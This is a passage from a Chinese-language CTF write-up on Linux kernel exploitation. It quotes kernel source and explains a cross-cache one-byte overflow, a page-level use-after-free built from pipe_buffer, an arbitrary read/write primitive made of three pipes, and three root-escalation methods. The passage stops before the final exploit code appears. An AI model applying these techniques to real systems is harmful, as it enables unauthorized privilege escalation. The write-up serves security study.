class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>相应地， <code>pgv</code> 中的页面也会在 socket 被关闭后释放：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    free_pg_vec()<br></code></pre></td></tr></table></figure><p> <code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p><p>由此，我们可以获得<strong>对一块连续内存的页级掌控</strong>，从而可以这样构造出如下图所示堆布局：</p><ul><li>先释放一部分页面，让 victim object 取得这些页面</li><li>释放一份页面，向题目模块请求分配对象，从而获得该份页面</li><li>再释放一部分页面，让 victim object 取得这些页面</li></ul><p>这样题目所在的页面便会被夹在 victim 对象的页面中间，使得<strong>溢出的稳定性大幅增加</strong></p><p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="image.png"></p><h2 id="Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-更改-pipe-buffer-所在-slub-大小，跨页溢出构造页级-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) 更改 pipe_buffer 所在 slub 大小，跨页溢出构造页级 UAF</h2><p>接下来我们考虑溢出的目标对象，相信大家最先想到的应该是万能结构体 <code>msg_msg</code> ，但是在笔者看来这个结构体 <em>仍旧不够强大</em> ，而且在过去的各种漏洞利用当中我们未免也太依赖于 <code>msg_msg</code> 了，所以笔者想要探索一些新的方法：）</p><p><img src="https://s2.loli.net/2023/05/01/sJB9zbLgSCYV8KE.png" alt="猪猪侠，你太依赖超级棒棒糖了.png"></p><p>由于仅有一个字节的溢出，毫无疑问的是我们需要寻找一些在结构体头部便有指向其他内核对象的指针的内核对象，我们不难想到的是 <code>pipe_buffer</code> 是一个非常好的的利用对象，其开头有着指向 <code>page</code> 结构体的指针，而 <code>page</code> 的大小仅为 <code>0x40</code> ，可以被 0x100 整除，若我们能够<strong>通过 partial overwrite 使得两个管道指向同一张页面，并释放掉其中一个</strong>，我们便构造出了<strong>页级的 UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>同时<strong>管道的特性还能让我们在 UAF 页面上任意读写</strong>，这真是再美妙不过了：）</p><p>但是有一个小问题，<code>pipe_buffer</code> 来自于 <code>kmalloc-cg-1k</code> ，其会请求 order-2 的页面，而题目模块的对象大小为 2k，其会请求 order-3 的页面，如果我们直接进行不同 order 间的堆风水的话，则利用成功率会大打折扣 :（</p><p>但 pipe 可以被挖掘的潜力远比我们想象中大得多：）现在让我们重新审视 <code>pipe_buffer</code> 的分配过程，其实际上是单次分配 <code>pipe_bufs</code> 个 <code>pipe_buffer</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>这里注意到 <code>pipe_buffer</code> <strong>不是一个常量而是一个变量</strong>，那么<strong>我们能否有方法修改 pipe_buffer 的数量？</strong>答案是肯定的，pipe 系统调用非常贴心地为我们提供了 <code>F_SETPIPE_SZ</code> <strong>让我们可以重新分配 pipe_buffer 并指定其数量</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>那么我们不难想到的是<strong>我们可以通过 fcntl() 重新分配单个 pipe 的 pipe_buffer 数量，</strong>：</p><ul><li>对于每个 pipe 我们<strong>指定分配 64 个 pipe_buffer，从而使其向 kmalloc-cg-2k 请求对象，而这将最终向 buddy system 请求 order-3 的页面</strong></li></ul><p>由此，我们便成功使得 <code>pipe_buffer</code> 与题目模块的对象<strong>处在同一 order 的内存页上</strong>，从而提高 cross-cache overflow 的成功率</p><p>不过需要注意的是，由于 page 结构体的大小为 0x40，其可以被 0x100 整除，因此若我们所溢出的目标 page 的地址最后一个字节刚好为 <code>\x00</code>，  <em>那就等效于没有溢出</em>  ，因此实际上利用成功率仅为 <code>75% </code> （悲）</p><h2 id="Step-III-构造二级自写管道，实现任意内存读写"><a href="#Step-III-构造二级自写管道，实现任意内存读写" class="headerlink" title="Step.III - 构造二级自写管道，实现任意内存读写"></a>Step.III - 构造二级自写管道，实现任意内存读写</h2><p>有了 page-level UAF，我们接下来考虑向这张页面分配什么结构体作为下一阶段的 victim object</p><p>由于管道本身便提供给我们读写的功能，而我们又能够调整 <code>pipe_buffer</code> 的大小并重新分配结构体，那么再次选择 <code>pipe_buffer</code> 作为 victim object 便是再自然不过的事情：）</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>接下来我们可以通过 UAF 管道<strong>读取 pipe_buffer 内容，从而泄露出 page、pipe_buf_operations 等有用的数据</strong>（可以在重分配前预先向管道中写入一定长度的内容，从而实现数据读取），由于我们可以通过 UAF 管道直接改写 <code>pipe_buffer</code> ，因此将漏洞转化为 dirty pipe 或许会是一个不错的办法（这也是本次比赛中 NU1L 战队的解法）</p><p>但是 pipe 的强大之处远不止这些，由于我们可以对 UAF 页面上的 <code>pipe_buffer</code> 进行读写，我们可以<strong>继续构造出第二级的 page-level UAF</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>为什么要这么做呢？在第一次 UAF 时我们获取到了 page 结构体的地址，而 page 结构体的大小固定为 0x40，<strong>且与物理内存页一一对应</strong>，试想若是我们可以不断地修改一个 pipe 的 page 指针，<strong>则我们便能完成对整个内存空间的任意读写</strong>，因此接下来我们要完成这样的一个利用系统的构造</p><p>再次重新分配 <code>pipe_buffer</code> 结构体到第二级 page-level UAF 页面上，<strong>由于这张物理页面对应的 page 结构体的地址对我们而言是已知的，我们可以直接让这张页面上的 pipe_buffer 的 page 指针指向自身，从而直接完成对自身的修改</strong>：</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>这里我们可以篡改 <code>pipe_buffer.offset</code> 与 <code>pipe_buffer.len</code> 来移动 pipe 的读写起始位置，从而实现无限循环的读写，但是这两个变量会在完成读写操作后重新被赋值，因此这里我们使用<strong>三个管道</strong>：</p><ul><li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成 ：）</li><li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li><li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置、第二个管道的写入起始位置指向第三个管道</li></ul><p>通过这三个管道之间互相循环修改，我们便<strong>实现了一个可以在内存空间中进行近乎无限制的任意读写系统</strong> ：）</p><h2 id="Step-IV-提权"><a href="#Step-IV-提权" class="headerlink" title="Step.IV - 提权"></a>Step.IV - 提权</h2><p>有了内存空间中的任意读写，提权便是非常简便的一件事情了，这里笔者给出三种提权方法：）</p><h3 id="方法一、修改当前进程的-task-struct-的-cred-为-init-cred"><a href="#方法一、修改当前进程的-task-struct-的-cred-为-init-cred" class="headerlink" title="方法一、修改当前进程的 task_struct 的 cred 为 init_cred"></a>方法一、修改当前进程的 task_struct 的 cred 为 init_cred</h3><p><code>init_cred</code> 为有着 root 权限的 cred，我们可以直接将当前进程的 cred 修改为该 cred 以完成提权，这里iwom可以通过 <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> 修改 <code>task_struct.comm</code> ，从而方便搜索当前进程的 <code>task_struct</code> 在内存空间中的位置：）</p><p>不过 <code>init_cred</code> 的符号有的时候是不在 <code>/proc/kallsyms</code> 中导出的，我们在调试时未必能够获得其地址，因此这里笔者选择通过解析 <code>task_struct</code> 的方式向上一直找到 <code>init</code> 进程（所有进程的父进程）的 <code>task_struct</code> ，从而获得 <code>init_cred</code> 的地址：</p><p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p><h3 id="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP"><a href="#方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成-ROP" class="headerlink" title="方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP"></a>方法二、内核页表解析获取内核栈物理地址，利用直接映射区覆写内核栈完成 ROP</h3><p><strong>开启了 CFI 并不代表我们便不能够在内核空间中进行任意代码执行了，作为一名黑客没有什么是不可能的，所因此我们仍然要进行任意代码执行：）</strong>（←有点中二的一个人</p><p>由于 page 结构体数组与物理内存页一一对应的缘故，我们可以很轻易地在物理地址与 page 结构体地址间进行转换，而在页表当中存放的是物理地址，我们不难想到的是<strong>我们可以通过解析当前进程的页表来获取到内核栈的物理地址，从而获取到内核栈对应的 page</strong>，之后我们可以<strong>直接向内核栈上写 ROP chain 来完成任意代码执行</strong></p><p>页表的地址可以通过 <code>mm_struct</code> 获取， <code>mm_struct</code> 地址可以通过 <code>task_struct</code> 获取，内核栈地址同样可以通过 <code>task_struct</code> 获取，那么这一切其实是水到渠成的事情：</p><p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p><blockquote><p>但这种方法有一个缺陷，我们会<strong>有一定概率没法直接写到当前进程的内核栈上</strong>（也不知道写哪去了），从而导致 ROP 失败，<strong>原因不明</strong></p><blockquote><p>笔者暂时没有发现整个过程的原理存在缺陷的地方，甚至尝试多次重新解析页表（得到的内核栈地址不变）然后写入数据后仍旧无事发生，也不知道究竟是哪出了问题 ：(</p></blockquote></blockquote><h3 id="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA"><a href="#方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现-USMA" class="headerlink" title="方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA"></a>方法三、内核页表解析获取代码段物理地址，改写内核页表建立新映射实现 USMA</h3><p>既然我们能够进行内存空间中的任意读写，<strong>直接改写内核代码段也是一个实现任意代码执行的好办法</strong>，但是直接映射区对应的内核代码段区域<strong>没有可写入权限，直接写会导致 kernel panic :（</strong></p><p>但是改写内核代码段本质上便是向对应的物理页写入数据，而我们又能够读写进程页表，<strong>我们直接在用户空间建立一个到内核代码段对应物理内存的映射就能改写内核代码段了：）</strong></p><p>方便起见，我们可以先通过 <code>mmap()</code> 随便映射一块内存，之后改写 <code>mmap()</code> 的虚拟地址在页表中对应的物理地址即可，这种方法本质上其实就是 <a href="https://vul.360.net/archives/391">用户态映射攻击</a>：</p><p><img src="https://s2.loli.net/2023/05/02/U3BEbFTsZiy48NQ.png" alt="image.png"></p><h2 id="Final-Exploitation"><a href="#Final-Exploitation" class="headerlink" title="Final Exploitation"></a>Final Exploitation</h2><p>最终的完整 exp 如下，<strong>同时包含笔者所给出的三种提权手段的代码</strong>：</p><blockquote><p>由于 page 结构体地址可能出现末字节为 <code>\x00</code> 的情况，故成功几率仅有 75% （悲）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span 